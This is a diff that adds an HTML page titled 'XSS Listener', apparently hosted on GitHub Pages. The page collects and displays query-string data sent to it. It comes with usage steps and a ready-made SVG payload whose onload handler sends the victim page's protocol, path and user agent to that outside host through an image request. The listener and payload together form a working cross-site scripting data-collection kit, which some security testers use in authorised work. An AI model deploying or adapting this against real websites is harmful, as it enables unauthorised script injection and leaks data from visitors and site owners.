@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>XSS Listener</title>
+    <script>
+        // Function to save logs
+        function saveLog(data) {
+            const logs = JSON.parse(localStorage.getItem('xss_logs') || '[]');
+            logs.unshift({
+                timestamp: new Date().toISOString(),
+                data: data
+            });
+            // Keep only last 50 logs
+            localStorage.setItem('xss_logs', JSON.stringify(logs.slice(0, 50)));
+            
+            // Also update display
+            updateDisplay();
+        }
+        
+        // Function to display logs
+        function updateDisplay() {
+            const logs = JSON.parse(localStorage.getItem('xss_logs') || '[]');
+            const container = document.getElementById('logs');
+            container.innerHTML = logs.map(log => `
+                <div class="log-entry">
+                    <strong>${new Date(log.timestamp).toLocaleString()}</strong><br>
+                    <pre>${JSON.stringify(log.data, null, 2)}</pre>
+                </div>
+            `).join('');
+            
+            // Show count
+            document.getElementById('count').textContent = logs.length;
+        }
+        
+        // Check URL for incoming data
+        window.onload = function() {
+            const params = new URLSearchParams(window.location.search);
+            if(params.toString()) {
+                const data = {};
+                for(const [key, value] of params.entries()) {
+                    data[key] = value;
+                }
+                saveLog(data);
+                
+                // Clear URL params after capturing
+                window.history.replaceState({}, document.title, window.location.pathname);
+            }
+            
+            updateDisplay();
+            setInterval(updateDisplay, 3000); // Refresh every 3 seconds
+        };
+    </script>
+    <style>
+        body { font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; }
+        .log-entry { border: 1px solid #ccc; margin: 10px 0; padding: 10px; background: #f9f9f9; }
+        pre { background: #fff; padding: 10px; overflow: auto; }
+        .header { background: #4CAF50; color: white; padding: 20px; border-radius: 5px; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>🎯 XSS Listener Active</h1>
+        <p>Endpoint: <code>https://nightmare7-7-7.github.io/sensetive-listener/</code></p>
+        <p>Total requests: <span id="count">0</span></p>
+    </div>
+    
+    <h2>📋 How to use:</h2>
+    <ol>
+        <li>Use this URL in your SVG payloads</li>
+        <li>When SVG executes, data will appear below</li>
+        <li>Page auto-refreshes logs every 3 seconds</li>
+        <li>Logs are saved in browser's localStorage</li>
+    </ol>
+    
+    <h2>🚀 SVG Payload:</h2>
+    <pre>
+&lt;svg xmlns="http://www.w3.org/2000/svg" onload="
+  new Image().src='https://nightmare7-7-7.github.io/sensetive-listener/?'+
+  'proto='+encodeURIComponent(window.location.protocol)+
+  '&amp;file='+encodeURIComponent(window.location.pathname)+
+  '&amp;ua='+encodeURIComponent(navigator.userAgent)+
+  '&amp;t='+Date.now();
+"&gt;
+  &lt;circle cx="100" cy="100" r="80" fill="red"/&gt;
+&lt;/svg&gt;
+    </pre>
+    
+    <h2>📊 Live Logs:</h2>
+    <div id="logs">
+        <p>No requests yet. Use the SVG payload above to test.</p>
+    </div>
+    
+    <script>
+        // Test button
+        document.getElementById('testBtn')?.addEventListener('click', function() {
+            new Image().src = 'https://nightmare7-7-7.github.io/sensetive-listener/?test=true&time=' + Date.now();
+            alert('Test request sent! Check logs below.');
+        });
+    </script>
+</body>
+</html>
